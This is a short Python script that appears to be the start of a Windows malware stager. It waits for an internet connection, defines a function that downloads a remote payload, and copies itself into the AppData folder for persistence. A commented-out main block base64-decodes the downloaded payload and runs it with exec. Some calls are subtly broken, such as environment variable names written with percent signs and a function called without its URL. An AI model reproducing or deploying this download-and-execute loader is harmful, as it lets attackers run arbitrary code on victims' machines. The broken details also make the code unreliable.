from curses import keyname
import os

# print(os.name)
if os.name != "nt":
    print("Not windows! ")
    # exit()



#main imports
from base64 import b64decode
import urllib.request
import sys

#Locations
Locations = {
    "Appdata": os.getenv("%APPDATA%"),
    "localAppdata": os.getenv("%LOCALAPPDATA%"),
    "Temp": os.getenv("TEMP")
}

#Check Internet Connection
notconnected = True
while notconnected:
    try:
        urllib.request.urlopen("https://google.com")
        notconnected = False
    except:
        pass

#Stage1
def stager1(URL):
    "Stager 1 download"
    with urllib.request.urlopen(URL) as url:
        return url.read()

#File Location
def checkfilelocation():
    "File Location to save"
    current_dir = os.getcwd()
    if current_dir != Locations['Appdata']:
        curr = open(sys.argv[0])
        cont = curr.read()
        curr.close()
        f = open(Locations["Appdata"]+"//"+sys.argv[0],'w')
        f.write(cont)
        f.close()







            

    


'''
if __name__=="__main__":
    checkfilelocation()
    stager1 = b64decode(stager1())
    ans = exec(stager1)
'''
